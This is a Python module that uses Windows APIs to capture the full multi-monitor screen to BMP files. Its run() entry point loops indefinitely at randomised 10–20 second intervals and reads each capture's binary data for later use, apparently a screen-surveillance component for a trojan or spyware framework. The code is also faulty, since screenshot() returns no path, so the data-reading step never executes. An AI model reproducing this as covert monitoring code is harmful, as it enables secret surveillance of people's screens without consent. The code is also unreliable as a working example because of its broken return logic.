import os
import time
import random
import win32api
import win32con
import win32gui
import win32ui

# Function to retrieve the dimensions of the virtual screen (all monitors combined)
def get_dimensions():
    # Total width of the virtual screen
    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
    # Total height of the virtual screen
    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
    # Leftmost coordinate of the virtual screen
    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
    # Topmost coordinate of the virtual screen
    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
    # Return dimensions as a tuple
    return (width, height, left, top)

# Function to take a screenshot of the entire virtual screen
def screenshot(name='screenshot'):
    try:
        # Ensure the 'screenshots' directory exists
        os.makedirs('screenshots', exist_ok=True)

        # Get the handle to the desktop window
        hdesktop = win32gui.GetDesktopWindow()
        # Retrieve screen dimensions using the helper function
        width, height, left, top = get_dimensions()

        # Get the device context (DC) of the desktop
        desktop_dc = win32gui.GetWindowDC(hdesktop)
        # Create a DC object from the desktop DC handle
        img_dc = win32ui.CreateDCFromHandle(desktop_dc)
        # Create a memory-based DC compatible with the desktop DC
        mem_dc = img_dc.CreateCompatibleDC()

        # Create a bitmap object to store the screenshot
        screenshot = win32ui.CreateBitmap()
        # Configure the bitmap dimensions to match the screen size
        screenshot.CreateCompatibleBitmap(img_dc, width, height)
        # Select the bitmap into the memory DC
        mem_dc.SelectObject(screenshot)

        # Perform the actual screen capture using BitBlt (Bit Block Transfer)
        mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)

        # Save the captured bitmap to a file
        screenshot.SaveBitmapFile(mem_dc, f'screenshots/{name}.bmp')

        # Cleanup: delete memory DC and release the screenshot object
        mem_dc.DeleteDC()
        win32gui.DeleteObject(screenshot.GetHandle())

        print(f"Screenshot saved as: screenshots/{name}.bmp")
    except Exception as e:
        print(f"An error occurred during screenshot: {e}")

# Function designed for modular use (e.g., within another project)
def run(**args):
    while True:
        timestamp = int(time.time())
        screenshot_name = f"screenshot_{timestamp}"

        # Take a screenshot and save it
        file_path = screenshot(name=screenshot_name)
        if file_path:
            # Read the screenshot binary data
            with open(file_path, 'rb') as f:
                img = f.read()

            print(f"Screenshot binary data prepared for: {file_path}")

        sleep_time = random.randint(10, 20)
        print(f"Next screenshot in {sleep_time} seconds.")
        time.sleep(sleep_time)